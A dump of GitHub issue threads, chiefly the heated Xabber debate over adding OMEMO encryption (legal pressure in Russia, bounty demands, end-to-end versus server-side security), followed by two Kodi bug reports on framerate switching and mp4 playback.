mean OMEMO. fixed. Thx.  Amen. There is far too much demanding with no ""put your money where your mouth is"" [American idiom].  Encryption is not a crime. If russian users or any terrorists group or nazis or any bad people uses whatsapp, no body can say that whatsapp is evil. we have a bigger issue than adding one more encryption protocol @friend  Oh, not this again. Xabber is not evil, and any app is not evil, but you know who is? FSB! (formerly known as KGB) To be clear, here is a breakdown of what we have from having OTR in Xabber  tons of help support requests from idiots who are clearly junkies and know NOTHING about XMPP, just install it because their supplier told them so and are pissed off because it's not as simple as Whatsapp visits from FSB operatives who coerce us into installing backdoors into Xabber so they can read chats that are supposed to be secure threads like this on GitHub zero revenue  Do you have any understanding how easy it is to get jailed in Russia if you cross FSB? So, please, go preach this 'encryption is not a crime' to someone else. We know it's not a crime, but in current situation our options are a bit limited  put backdoors into Xabber refuse to put backdoors into Xabber (and quite possibly get jailed, for, like, drug trade) remove Xabber from russian app store  Of these three, if things will get really heated, the only viable option for us is last one.  That would maybe be the easiest option. And clearly better than adding backdoors and getting jailed or so. I mean those who need it, could still install it from F-Droid or compile it by themselves. I wonder anyway why drug dealers would install that app. I mean using WhatsApp would maybe not be the worst choice for their threat model.  @friend whatsapp exposes phone numbers, and is also... kinda not really trusted among this group of users. Corporation behind whatsapp might very well start responding to requests to disclose user information including IP addresses and such. XMPP working over TOR has this threat reduced to nothing.  @friend yeah, elite. Maybe you'll volunteer to answer support requests from our russian users?  You can achieve this locally using a rachet. Just encrypt messages using a rachet (new derived key every message) and only store the key for last X messages. Then have the original key to the first message be encrypted using PIN and a slow key derivation function (lots of iterations).  You need to do encryption. It doesn't violate and laws. Its should be/must have. OMEMO is good technology and should be implemented.  @friend so many people here telling us what we should do. Unfortunately, they tend to forget to back their instructions with payment.  Well… if you mean that serious (which I doubt wink ) you could setup a bountysource for this issue and collect money for it. I doubt though… that this really solves the initial legal problem that makes this issue staling.  @friend I'm very serious. When I tell Xabber developers what they should do today, I back my instructions with payment. I think it's fair that anyone who wants to give them instructions should too back it with payment. All by himself, owning responsibility for what he wants us to do. Why should someone on bountysource pay for what @friend wishes?  Bountysource does not work that way. Here is how it works  Anyone who wants this issue solved, pays in money there. When this issue is solved and you accept a PR (or implement it yourself) you can get the money from there.  So if you want to do that, just signup there, claim ownership over the account there and add a prominent link to the top of this issue.  @friend why should I care how Bountysource works? The one who wants issue solved is not me, but @friend . So HE can negotiate the price with us, raise money with whatever means he has, pay us and get the job done.  Not payment. I must ask my daugther first, she has made my xabber account, because I'm ill.  Can you restore my account? Von Samsung-Tablet gesendet -------- Ursprüngliche Nachricht --------Von rugk notifications@friend.com Datum 03.06.18  1328  (GMT+0100) An redsolution/xabber-android xabber-android@friend.github.com Cc Subscribed subscribed@friend.github.com Betreff Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540) Why should someone on bountysource pay for what @friend wishes? Bountysource does not work that way. Here is how it works Anyone who wants this issue solved, pays in money there. When this issue is solved and you accept a PR (or implement it yourself) you can get the money from there. So if you want to do that, just signup there, claim ownership over the account there and add a prominent link to the top of this issue. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub, or mute the thread. {""@friend"""" Issue""},""description""""View this Issue on GitHub"",""publisher""{""@friend""""Organization"",""name""""GitHub"",""url"""" repository"",""main_image_url"""" in GitHub"",""url"""" in #540 \u003e Why should someone on bountysource pay for what @friend wishes?\r\n\r\nBountysource does not work that way. Here is how it works\r\n1. Anyone who wants this issue solved, pays in money there.\r\n2. When this issue is solved and you accept a PR (or implement it yourself) you can get the money from there.\r\n\r\nSo if you want to do that, just signup there, claim ownership over the account there and add a prominent link to the top of this issue.""}],""action""{""name""""View Issue"",""url"""" ""MessageCard"", ""@friend"" "" ""false"", ""originator"" ""37567f93-e2a7-4e2a-ad37-a9160fc62647"", ""title"" ""Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)"", ""sections"" [ { ""text"" """", ""activityTitle"" ""rugk"", ""activityImage"" "" ""@friend"", ""facts"" [ ] } ], ""potentialAction"" [ { ""name"" ""Add a comment"", ""@friend"" ""ActionCard"", ""inputs"" [ { ""isMultiLine"" true, ""@friend"" ""TextInput"", ""id"" ""IssueComment"", ""isRequired"" false } ], ""actions"" [ { ""name"" ""Comment"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueComment\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540,\n\""IssueComment\"" \""{{IssueComment.value}}\""\n}"" } ] }, { ""name"" ""Close issue"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueClose\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540\n}"" }, { ""targets"" [ { ""os"" ""default"", ""uri"" "" ""OpenUri"", ""name"" ""View on GitHub"" }, { ""name"" ""Unsubscribe"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""MuteNotification\"",\n\""threadId\"" 98784137\n}"" } ], ""themeColor"" ""26292E"" }   Do not understand your emails. Please wait one week till my daughter come back, she'll say me, what you write. You have no help in German? Von Samsung-Tablet gesendet -------- Ursprüngliche Nachricht --------Von Andrew Nenakhov notifications@friend.com Datum 03.06.18  1407  (GMT+0100) An redsolution/xabber-android xabber-android@friend.github.com Cc Subscribed subscribed@friend.github.com Betreff Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)  @friend why should I care how Bountysource works? The one who wants issue solved is not me, but @friend . So HE can negotiate the price with us, raise money with whatever means he has, pay us and get the job done. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub, or mute the thread. {""@friend"""" Issue""},""description""""View this Issue on GitHub"",""publisher""{""@friend""""Organization"",""name""""GitHub"",""url"""" repository"",""main_image_url"""" in GitHub"",""url"""" in #540 @friend why should I care how Bountysource works? The one who wants issue solved is not me, but @friend . So HE can negotiate the price with us, raise money with whatever means he has, pay us and get the job done.""}],""action""{""name""""View Issue"",""url"""" ""MessageCard"", ""@friend"" "" ""false"", ""originator"" ""37567f93-e2a7-4e2a-ad37-a9160fc62647"", ""title"" ""Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)"", ""sections"" [ { ""text"" """", ""activityTitle"" ""Andrew Nenakhov"", ""activityImage"" "" ""@friend"", ""facts"" [ ] } ], ""potentialAction"" [ { ""name"" ""Add a comment"", ""@friend"" ""ActionCard"", ""inputs"" [ { ""isMultiLine"" true, ""@friend"" ""TextInput"", ""id"" ""IssueComment"", ""isRequired"" false } ], ""actions"" [ { ""name"" ""Comment"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueComment\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540,\n\""IssueComment\"" \""{{IssueComment.value}}\""\n}"" } ] }, { ""name"" ""Close issue"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueClose\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540\n}"" }, { ""targets"" [ { ""os"" ""default"", ""uri"" "" ""OpenUri"", ""name"" ""View on GitHub"" }, { ""name"" ""Unsubscribe"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""MuteNotification\"",\n\""threadId\"" 98784137\n}"" } ], ""themeColor"" ""26292E"" }  @friend see what you've done?  @friend Dies ist nicht der richtige Ort für solche Supportanfragen ) This is not the right place for this kind of questions.  I speak about my xabber account, and you write about prices.I need xabber help to restore my account. I have cancel my xabber account by mistake.Thank you for your help, but you arenot right here.Heide Hemmelrath Von Samsung-Tablet gesendet -------- Ursprüngliche Nachricht --------Von Andrew Nenakhov notifications@friend.com Datum 03.06.18  1407  (GMT+0100) An redsolution/xabber-android xabber-android@friend.github.com Cc Subscribed subscribed@friend.github.com Betreff Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)  @friend why should I care how Bountysource works? The one who wants issue solved is not me, but @friend . So HE can negotiate the price with us, raise money with whatever means he has, pay us and get the job done. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub, or mute the thread. {""@friend"""" Issue""},""description""""View this Issue on GitHub"",""publisher""{""@friend""""Organization"",""name""""GitHub"",""url"""" repository"",""main_image_url"""" in GitHub"",""url"""" in #540 @friend why should I care how Bountysource works? The one who wants issue solved is not me, but @friend . So HE can negotiate the price with us, raise money with whatever means he has, pay us and get the job done.""}],""action""{""name""""View Issue"",""url"""" ""MessageCard"", ""@friend"" "" ""false"", ""originator"" ""37567f93-e2a7-4e2a-ad37-a9160fc62647"", ""title"" ""Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)"", ""sections"" [ { ""text"" """", ""activityTitle"" ""Andrew Nenakhov"", ""activityImage"" "" ""@friend"", ""facts"" [ ] } ], ""potentialAction"" [ { ""name"" ""Add a comment"", ""@friend"" ""ActionCard"", ""inputs"" [ { ""isMultiLine"" true, ""@friend"" ""TextInput"", ""id"" ""IssueComment"", ""isRequired"" false } ], ""actions"" [ { ""name"" ""Comment"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueComment\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540,\n\""IssueComment\"" \""{{IssueComment.value}}\""\n}"" } ] }, { ""name"" ""Close issue"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueClose\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540\n}"" }, { ""targets"" [ { ""os"" ""default"", ""uri"" "" ""OpenUri"", ""name"" ""View on GitHub"" }, { ""name"" ""Unsubscribe"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""MuteNotification\"",\n\""threadId\"" 98784137\n}"" } ], ""themeColor"" ""26292E"" }  Generally speaking, this is a place to discuss developer problems, specifically implementing a new feature in this case. You do have a user problem. Please seek help from the Xabber Support Team, not on Github. Unfortunately you are kind of making it hard to follow the original topic of this discussion with your request. @friend Can you later delete this part of the discussion?  @friend if you need our help with Xabber account, please email support@friend.com  This thread on Github is not for tech support. It's a place where crytonerds and cryptojerks try to coerce us to develop new functionality for our app so they could feel really safe from surveillance  @friend don't wanna delete it, it's the most amusing part of this thread!  I'm waiting for my daughter, she say me, what I can doWhy I can't restore my xabber account and where? I don't find it, that is the question. I have cancel it by mistake.That's all.Heide Hemmelrath Xabber name ( heideline) Von Samsung-Tablet gesendet -------- Ursprüngliche Nachricht --------Von Paul Schaub notifications@friend.com Datum 03.06.18  1431  (GMT+0100) An redsolution/xabber-android xabber-android@friend.github.com Cc heideline hm.hemmelrath@friend.com, Mention mention@friend.github.com Betreff Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)  @friend Dies ist nicht der richtige Ort für solche Supportanfragen ) This is not the right place for this kind of questions. — You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub, or mute the thread. {""@friend"""" Issue""},""description""""View this Issue on GitHub"",""publisher""{""@friend""""Organization"",""name""""GitHub"",""url"""" repository"",""main_image_url"""" in GitHub"",""url"""" in #540 @friend Dies ist nicht der richtige Ort für solche Supportanfragen )\r\nThis is not the right place for this kind of questions.""}],""action""{""name""""View Issue"",""url"""" ""MessageCard"", ""@friend"" "" ""false"", ""originator"" ""37567f93-e2a7-4e2a-ad37-a9160fc62647"", ""title"" ""Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)"", ""sections"" [ { ""text"" """", ""activityTitle"" ""Paul Schaub"", ""activityImage"" "" ""@friend"", ""facts"" [ ] } ], ""potentialAction"" [ { ""name"" ""Add a comment"", ""@friend"" ""ActionCard"", ""inputs"" [ { ""isMultiLine"" true, ""@friend"" ""TextInput"", ""id"" ""IssueComment"", ""isRequired"" false } ], ""actions"" [ { ""name"" ""Comment"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueComment\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540,\n\""IssueComment\"" \""{{IssueComment.value}}\""\n}"" } ] }, { ""name"" ""Close issue"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueClose\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540\n}"" }, { ""targets"" [ { ""os"" ""default"", ""uri"" "" ""OpenUri"", ""name"" ""View on GitHub"" }, { ""name"" ""Unsubscribe"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""MuteNotification\"",\n\""threadId\"" 98784137\n}"" } ], ""themeColor"" ""26292E"" }  @friend I'm sure your daughter can help you ) Please show her our discussion afterwards ;)  What a bunch of nonsense! Developers want money in advance for code they don't want to write, don't think it makes sense and aren't allowed to offer. Then they accuse their more interested customers for the mistakes of overtaxed noobs and find that funny. Why is this discussion not simply closed if you do not want to fulfil this desire for OMEMO? By the way, thanks to Liberapay I donate regularly for the further development of my xmpp client. However, this is another app that OMEMO already masters and does not abuse its users as junkies. So, what am I doing here? Waiting for Godot? Goodbye!   Don't know, how I come to your side, sorry. I want to restore my xmpp account in Xabber. I get no answer and must read and read and I do not understand.That's not my mistake, but a bad help menagement. Good by! Developer -) HmHB Von Samsung-Tablet gesendet -------- Ursprüngliche Nachricht --------Von Buntbart notifications@friend.com Datum 03.06.18  1516  (GMT+0100) An redsolution/xabber-android xabber-android@friend.github.com Cc heideline hm.hemmelrath@friend.com, Mention mention@friend.github.com Betreff Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)  What a bunch of nonsense! Developers want money in advance for code they don't want to write, don't think it makes sense and aren't allowed to offer. Then they accuse their more interested customers for the mistakes of overtaxed noobs and find that funny. Why is this discussion not simply closed if you do not want to fulfil this desire for OMEMO? By the way, thanks to Liberapay I donate regularly for the further development of my xmpp client. However, this is another app that OMEMO already masters and does not abuse its users as junkies. So, what am I doing here? Waiting for Godot? Goodbye! — You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub, or mute the thread. {""@friend"""" Issue""},""description""""View this Issue on GitHub"",""publisher""{""@friend""""Organization"",""name""""GitHub"",""url"""" repository"",""main_image_url"""" in GitHub"",""url"""" in #540 What a bunch of nonsense! Developers want money in advance for code they don't want to write, don't think it makes sense and aren't allowed to offer. Then they accuse their more interested customers for the mistakes of overtaxed noobs and find that funny. Why is this discussion not simply closed if you do not want to fulfil this desire for OMEMO? By the way, thanks to Liberapay I donate regularly for the further development of my xmpp client. However, this is another app that OMEMO already masters and does not abuse its users as junkies. So, what am I doing here? Waiting for Godot? Goodbye!""}],""action""{""name""""View Issue"",""url"""" ""MessageCard"", ""@friend"" "" ""false"", ""originator"" ""37567f93-e2a7-4e2a-ad37-a9160fc62647"", ""title"" ""Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)"", ""sections"" [ { ""text"" """", ""activityTitle"" ""Buntbart"", ""activityImage"" "" ""@friend"", ""facts"" [ ] } ], ""potentialAction"" [ { ""name"" ""Add a comment"", ""@friend"" ""ActionCard"", ""inputs"" [ { ""isMultiLine"" true, ""@friend"" ""TextInput"", ""id"" ""IssueComment"", ""isRequired"" false } ], ""actions"" [ { ""name"" ""Comment"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueComment\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540,\n\""IssueComment\"" \""{{IssueComment.value}}\""\n}"" } ] }, { ""name"" ""Close issue"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueClose\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540\n}"" }, { ""targets"" [ { ""os"" ""default"", ""uri"" "" ""OpenUri"", ""name"" ""View on GitHub"" }, { ""name"" ""Unsubscribe"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""MuteNotification\"",\n\""threadId\"" 98784137\n}"" } ], ""themeColor"" ""26292E"" }  @friend earlier we differentiated users interested in encryption in two groups junkies and cryptonerds. However, recently we came to a conclusion that there is also a subset of users who should rather be called cryptojerks. Now, please leave our issue tracker. Forever.  Sorry where I  an delete the part of discussion? Developer we need, they our future. ;-). Von Samsung-Tablet gesendet -------- Ursprüngliche Nachricht --------Von Paul Schaub notifications@friend.com Datum 03.06.18  1448  (GMT+0100) An redsolution/xabber-android xabber-android@friend.github.com Cc heideline hm.hemmelrath@friend.com, Mention mention@friend.github.com Betreff Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)  Generally speaking, this is a place to discuss developer problems, specifically implementing a new feature in this case. You do have a user problem. Please seek help from the Xabber Support Team, not on Github. Unfortunately you are kind of making it hard to follow the original topic of this discussion with your request. @friend Can you later delete this part of the discussion? — You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub, or mute the thread. {""@friend"""" Issue""},""description""""View this Issue on GitHub"",""publisher""{""@friend""""Organization"",""name""""GitHub"",""url"""" repository"",""main_image_url"""" in GitHub"",""url"""" in #540 Generally speaking, this is a place to discuss developer problems, specifically implementing a new feature in this case. You do have a user problem. Please seek help from the Xabber Support Team, not on Github. Unfortunately you are kind of making it hard to follow the original topic of this discussion with your request.\r\n\r\n@friend Can you later delete this part of the discussion?""}],""action""{""name""""View Issue"",""url"""" ""MessageCard"", ""@friend"" "" ""false"", ""originator"" ""37567f93-e2a7-4e2a-ad37-a9160fc62647"", ""title"" ""Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)"", ""sections"" [ { ""text"" """", ""activityTitle"" ""Paul Schaub"", ""activityImage"" "" ""@friend"", ""facts"" [ ] } ], ""potentialAction"" [ { ""name"" ""Add a comment"", ""@friend"" ""ActionCard"", ""inputs"" [ { ""isMultiLine"" true, ""@friend"" ""TextInput"", ""id"" ""IssueComment"", ""isRequired"" false } ], ""actions"" [ { ""name"" ""Comment"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueComment\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540,\n\""IssueComment\"" \""{{IssueComment.value}}\""\n}"" } ] }, { ""name"" ""Close issue"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueClose\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540\n}"" }, { ""targets"" [ { ""os"" ""default"", ""uri"" "" ""OpenUri"", ""name"" ""View on GitHub"" }, { ""name"" ""Unsubscribe"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""MuteNotification\"",\n\""threadId\"" 98784137\n}"" } ], ""themeColor"" ""26292E"" }  @friend don't worry about that. Just send us email to support@friend.com with details of your account.  Wtf happened here? @friend could not you please delete the comments added by @friend, which have this huge bunch of email stuff there? And yeah, I'd also suggest to close this issue here. (maybe even lock it – it may be better wink) You seem to not want to implement it, or better can't, because of the legal things discussed before, so leave it as it. Users wanting to use OMEMO should use a different client. And I better unsubscribe this issue…  All users should use other client, as thankfully E2E encryption is finally starting to be enabled by default, so this client is starting to be incompatible with modern clients such as Conversations.  @friend yeah, Conversations users were very happy when they were forced to have that e2e bullshit forced on them. Processone even changed default config in so OMEMO encryption in Conversations wouldn't work out of the box in ejabberd.  I was not Converastions user before OMEMO was turned on by default by I am one now and I am very happy that it is forced on users. Unfortunately not everyone cares about e2e and that is fine when two such people communicate. But it is a pain to explain to people how to configure and/or use it as a person who actually cares about privacy. So yeah, even companies like Whatsapp got the memo and enabled e2e by default. And XMPP, which should have been leading the charge is lacking behind, because all the developers can't agree about anything except basic message sending. Here it is OMEMO, Conversations don't want to implement eCards because I don't know... It is ridiculous. I am not surprised XMPP never caught on.  @friend if you care about privacy, run your own server and communicate within it. The only persons e2e helps against are admins of yours and your chat buddy's servers. But while encryption brings users a false sense of security it also breaks a lot of things that are really important in real life, like server-side history search and device convergence.  First of all, e2e if done right is the only thing that can even start to provide some security. What would be the point? I would not trust myself to run it properly. All my friends would have to use my server or their own, both of which is impractical. The server can't be at my home because village internet and having it at a datacenter ruins the point. I really don't understand how it breaks device convergence and modern devices are powerful enough to run client-side searches, so who cares.  So you want to keep all your very safely transmitted messages decrypted on your pocket device? Lol. So if it gets lost, stolen or taken from you, whoever gets access to device will have all your data. So by trying to eliminate one security risk you introduce many others much more severe. What you don't get is that security and convenience don't fit together well. Encryption nerds lull themselves to be safe because they pressed some magic buttons in some app, only to get hacked via some security hole totally not related to message encryption protocol. Heard about that recent Signal code injection bug?  First of all, if nothing else, FDE. Second of all, what the hell is your point? Yes, if someone can walk up to me and get my device, they will get my messages, whether they are e2e encrypted or not as long as I store them (which I don't have to do for the sensitive ones). But for one, I can delete them and be reasonably sure they are deleted unlike with servers, which I can only hope they are doing something. And walking to me and taking my phone is a one time thing. With unencrypted messages, they can monitor them long term. As for code injection bug, sure. How does not encrypting messages prevent that? OPr should we just give up, because once in a while, there is a one time bug that almost no-one will be affected by?  I don't get why you are still discussing. If you read the backlog, you can see that both sides already brought every point up against each other. Xabber devs are not going to implement OMEMO in Xabber by themselves, no matter what great arguments you bring up. If you want OMEMO in Xabber, fork it and do it yourselves ) Xabber is based on Smack and Smack does have a module for that.  That can be quite routinely unlocked by any party that is really interested in getting what's inside. Encrypting database is a bit better, we do it for one of our customers. Point is that crypto-fetishists like the feeling of being secure, but when talking about providing themselves real security, nope, that's too hard to keep own server and control all communications. You introduce many more security risks to disclosure all your preciousss data to a potential attacker (or thief) by carrying it with you all the time, but you choose to be oblivious to those risks, pretending instead that e2e is the final solution to privacy (while running this perfectly secure messenger on an Android phone). And because real security is too damn hard and requires discipline and dedication, users don't really want that, opting for a cosy feeling of being safe.  @friend money is good enough argument. I think we could do this for just 1₿ ;)  I specifically said the opposite, that it is just the first step. And once more, attacks on server are many many times easier than on your phone. Having them on the server does not protect them unless you log out every time you close the app. It is irrelevant to whether e2e should be used, as this can be solved by encrypting the database. I honestly don't care much. I gave up on xabber as I wrote. I just thought I should reply here to prevent someone from buying the anti-encryption BS that is spreading around. E2E is not the whole solution, but it is certainly part of it. The most important first step, as while E2E does not provide perfect security by far, it decreases your attack surface massively.  And once more, attacks on server are many many times easier than on your phone.  Who told you that? Did you ever think that all your assumptions are based on wrong ideas? It does if you care to do some things to prevent access to message history. We actually implemented it for one of our customers, who really cares about security, and does not only pretends to be caring like most folks here. Speaking of spreading bullshit, that's exactly why I respond to all this massive outcry to encrypt everything instead of locking it down. Desire to encrypt everything is silly, and most sane developers know this, except those few who promote it as the main feature of their applications. btw, I wonder if all emails on that Gmail mailbox of yours are encrypted too, or is your e2e crusade  targeted only at chats?  targeted only at chats? I have PGP set up for email, but I practically never use it, because it is more convenient to switch to a secure IM. Using PGP for mail is just unreasonably hard and there is no reason not to use IM (use best tool for the job). Maybe I am not a sane developer, but I don't believe this. Maybe my assumptions are wrong or maybe yours are. Yes, but I never found a flaw in them. But considering you seem to be knowledgeable in the topic, you can point out my error if you see any. Here are my asumptions  There is no practical way a server can improve security in case of device compromise beyond what encryption can do. Reasoning for that is The only security feature reliant on server I ever heard of in connection with IM is protecting the chat history with additional passphrase. This can be done using encryption for example like this. Let Km be master key derived from sufficiently strong passphrase by sufficiently slow KDF. Let K0 be randomly generated key. Store K[0] in file encrypted by Km. Generate future keys K[i] = H('1' + K[i-1]). Generate K[1] and destroy K[0] (form memory). Keep n starting from 1 as message counter. When a message is supposed to be protected by passphrase (is old enough), encrypt it with K[n], generate K[nplus one] and store it. Throw away K[n].  Increment n. Your messages are encrypted and you need to enter the passphrase to decrypt them. To optimize this, after decrypting them for the first time, you can store them in the file encrypted by Km directly and replace K[0] with the current K[n] (+ increment the current n). This is just as resistant to device compromise as server side protection. If a malware is inserted, it can gain future messages in both cases and if passphrase is entered into infected device, it can be captured in both cases. Old messages can't be retrieved from stolen device without passphrase in both cases. Of course there may be other features I never heard of. If there are, please name at least one. But even then, they are not much use if they are not commonly implemented.  Trusting server in addition to the client (phone) creates new attack vector and therefore increases the attack surface. E2Ee mitigates this, as the server does not have to be trusted.  The assumptions 1 and 2 together mean E2Ee can only improve security, not weaken it.  Regular users who don't know a server provider can't verify providers trustworthines.  Only very few users (insignificant amount) have the skills, resources and time to run their own server. I don't believe I would be able to keep up with all the latest in security of servers let alone pay for all the equipment and SW such as firewalls, IDS... Even then, it is a lot of spent time and resources for something that can be better achieved by E2Ee.  Assumptions 4 and 5 together mean, that most users can't trust the server they use.  Even users running their own server securely can't easily trust the server of the other communicating party.  If trust is ever eroded in the server for some reason or just plainly better option arisses, it is not trivial to move to a new server as all your contacts need the new ID and you need to changed it wherever it is shown (which if it is somewhere written down in physical format may be near impossible).  Having a secure server only adds security to E2E scheme, it is not mutually exclusive. You can for example store the encrypted chat history on a server to further secure yourself (both server authentication and encryption would have to be broken to obtain your message history).    @friend thank you for proving my point with your own confession. Everything you write boils down to this you yourself preach encryption everywhere, yet, you yourself use in only when it is convenient enough (or ""not unreasonably hard""). And, since e2e is convenient enough for you, you want to force everyone to your level of convenience, and you don't really care if they want it or not. That, my friend, is hypocrisy. You see, I don't totally oppose the idea of encryption. It should be used when it is appropriate. It is nicely done in best messaging service out there - Telegram. It uses 'super reliable encryption' as it's marketing gimmick, yet, users love Telegram, not for their encrypted chats (that don't even work across all platforms, by the way), but because it works seamlessly on all their desktops, tablets and browsers, because you can search history, because it has great group chat experience. All of this is possible only because Telegram does what WhatsApp and Viber do not try to do (for reasons beyond my understanding) - it stores all users archives on central servers. And encrypted secret chats are used very sparingly in it, only when specifically enabled. That is a sane model that merges security and convenience in a good enough proportion, and users like it. That's what we're going to build too, one day. And you are pushing everyone to use e2e whether they like it or not.  You misrepresent what I wrote. I have PGP set up and my PGP key published, ready to send or recieve encrypted mail. I just deem it ""unreasonably hard"" to ask other people to use it when there is a better solution (IM). I am certainly not ashamed to ask everyone to use IMs that are encrypted by default, as that is literally ZERO effort on their side. There is no excuse not to use encrypted IM these days, as there is virtually no inconvenience (if well implemented). That is my point.  @friend no excuse, really? Just one thing, like the capability to have a nice history search in a web client, is a deal breaker for almost anyone who does some real work with XMPP.  @friend Great, so somehow we got from it being useless and bad for security all the way to, it disables one feature and only in webclients, who can't easily do OMEMO properly anyway... Are you trying to argue something or just throwing stuff around?  @friend I never told it's totally useless. But the desire to force everyone to press a magic button and pretend they are totally safe and secure is silly. It also breaks not 'one feature' but a number of killer features, like good device sync and server search, which are of paramount importance. And downloading all history from a server to client perform a search is not just stupid, but ultra-stupid. Anyway, you are totally free to do whatever you like, use whatever products you like, create whatever software you like, just don't try to press me into buying this bullshit about e2e and infect me with this crypto-cancer. For any capable user who really cares about security absolutely same security level can be achieved by running own server without e2e, all without losing all the other features we're working on. And I'll go on creating software as I like it and as my customers require it - and so far we didn't have any customers who would pay us for development of OMEMO in Xabber. You see, there is no real market demand for that, unlike, say, iOS version of Xabber, proper group chats or voice and video calls and fast device synchronization that we're working on now. Hope that makes my argument clear. Official public offer Anyone who wants us to add OMEMO functionality to Xabber for Android should pay us 1 bitcoin. Adding it to iOS and Web version would cost additional 0.5 bitcoin each. With this, I'm locking down this thread until further notice. ",173,29,3444,0.16279069767441862,0.4186046511627907,1992,73,
xbmc/xbmc/14675,0.28668108000000003,xbmc,xbmc,"Framerate change not work in 18, both x32 and x64",1662,5,7,0.6666666666666666,0,"Auto framerate change broken in Kodi 18. When I play 1080/50i video in Kodi17, it's change framerate on TV. There is nothing happens in Kodi 18, both x32 and x64. Fullscreen mode (not windowed) and autochange are enabled in settings. But fullscreen mode not work too, it's look like windowed mode forced. There is no ""SetFullScreenInternal"" in Kodi 18 log, like in 17. kodi17.log kodi18.log  Have you enabled Whitelisting? Also you did not follow our issue template  WTF is Whitelist ? Why it's empty by default ? Where it placed ? Why google not found it ? Why you broke years-worked setup and add hidden 'feature' and there is no information or attention in download section about this incompatible issue ? You can warn users in ""Download"" section, you can warn users on installation phase, you can open whitelist tab on first run, you can show some window on playstart with attention ""This resolution and framerate not in whitelist, do you want to add now?"" Instead, you simple do nothing, and every user spent weeks to find this error or to rollback to previous version. Too bad, Kodi, too bad.  Jeez stop whining.  With that attitude no one will care to even try to improve it. Also no one forced you to update so you can of course blame yourself  you realize that v18 is still not released, right? When implementing the whitelist approach (because of user demand) we decided to do some additional changes to prevent your issue, but unfortunately forgot about it after the feature got in (so many things had been going on in that time). So 👍 for the reminder and 👎 for not writing a proper bug report using our template and another 👎 for your last comment. ",6,0,55,0.125,0.20833333333333334,39,8,
xbmc/xbmc/14809,0.1740532,xbmc,xbmc,I can't play some mp4 files.,9652,112,71,0.5957446808510638,7,"   Bug report Describe the bug I can't play some mp4 and vob files. Files are not corrupted.     Your Environment Used Operating system    [x] Android [ ] iOS [ ] Linux [ ] OSX [ ] Raspberri-Pi [ ] Windows [ ] Windows UWP  Operating system version/name  Kodi version 18 rc1   note Once the issue is made we require you to update it with new information or Kodi versions should that be required. Team Kodi will consider your problem report however, we will not make any promises the problem will be solved.  Where's the debuglog that was asked and sample files? A screenshot is useless  I don't know how to upload log from Shield device. I need some time to upload files. wt., 6 lis 2018, 1355 Martijn Kaijser notifications@friend.com napisał(a)  Please read  how to submit logfiles.  Ok thank you. BTW I'm able to play those files on kodi 17. wt., 6 lis 2018, 1515 DaVukovic notifications@friend.com napisał(a)   is one whish I can't play.  hello, just downloaded you file and its playing fine. (Nvidia Shield - OS Ver 7.1 - Oreo 8.0) do you have access from your pc to the shield? then go to this folder internal\Android\data\org.xbmc.kodi\files\.kodi\temp - there is the log  Which kodi version do you use?  kodi 18 latest nightly. without a debug log, nobody can help you!  Could we please see a debuglog, now? You could also use the Logfile Uploader add-on to do so. That simply takes only a few moments. We can't help you without that Logfile and your issue might get closed without it. Thanks in advance  @friend your files simply cannot be accessed  I can play few files from this folder and few don't. I know 